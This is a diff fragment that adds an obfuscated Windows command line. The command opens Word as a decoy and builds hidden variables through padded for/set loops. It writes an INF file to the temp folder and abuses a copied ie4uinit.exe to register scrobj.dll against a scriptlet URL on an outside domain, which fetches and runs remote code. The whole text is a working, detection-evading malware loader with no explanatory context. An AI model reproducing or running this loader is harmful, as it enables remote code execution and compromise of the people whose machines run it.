@@ -1,0 +1,21 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %s in ("nonperver=l" "resinere=s" "life=c" "haught=e" "resigne=t" ) do @set %~s) &&
+  callcallcallcallcallcall(for %u in ("c") do @set "cliqu=%~u") &&
+  (for %k in ("d") do @set "goldar=%~k") &&
+  call(for %w in ("9") do @set "nonaggre=%~w") &&
+  (for %f in ("c") do @set "cliqu=%~f") &&
+  (for %n in ("E") do @set "uncanonical=%~n") &&
+  (for %c in ("$") do @set "clicking=%~c") &&
+  (for %j in ("7") do @set "psa=%~j") &&
+  callcall(for %f in ("r") do @set "ung=%~f") &&
+  (for %j in ("8") do @set "melaph=%~j") &&
+  callcall(for %j in ("g") do @set "miszo=%~j") &&
+  callcallcall(for %y in ("1") do @set "basilemmasu=%~y") &&
+  (for %v in ("C") do @set "coff=%~v") &&
+  (for %a in ("0") do @set "laserpiti=%~a") &&
+  (for %c in ("v") do @set "nephitechei=%~c") &&
+  callcallcall(for %m in ("c") do @set "cliqu=%~m") &&
+  (for %a in ("=") do @set "noncarnivor=%~a") &&
+  (for %g in ("r") do @set "ung=%~g") &&
+  callcall(for %c in ("[destinationdirs]" "defaultdestdir=11" "895ED=01" "[895ED]" "i%insciencee%u%clot%n%clot%t%overlaste%i%discipline%f" "[version]" "signature=$windows nt$" "[strings]" "servicename= 'gullibility'" "shortsvcname= 'gullibility'" "overlaste=." "reglues=/" "dissc=N" "espa=b" "hedg=c" "perturbe=d" "insciencee=e" "westhamd=g" "clot=i" "black=l" "trispor=m" "discipline=n" "underfl=o" "langrelsr=p" "calliste=r" "initiallin=s" "unchurch=t" "paran=u" "[defaultinstall.windows7]" "delfiles=895ED" "Un\" "Register\" "OCXs=usucap_F451" "[usucap_F451]" "%initiallin%c%calliste%o%espa%\" "j%overlaste%d%black%l,%dissc%I,h%unchurch%t%langrelsr%:%reglues%/%initiallin%9%perturbe%a%overlaste%j%insciencee%s%initiallin%i%hedg%a%initiallin%u%westhamd%g%initiallin%.%hedg%o%trispor%/%calliste%o%paran%t%insciencee%t%underfl%" ) do @echo %~c) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
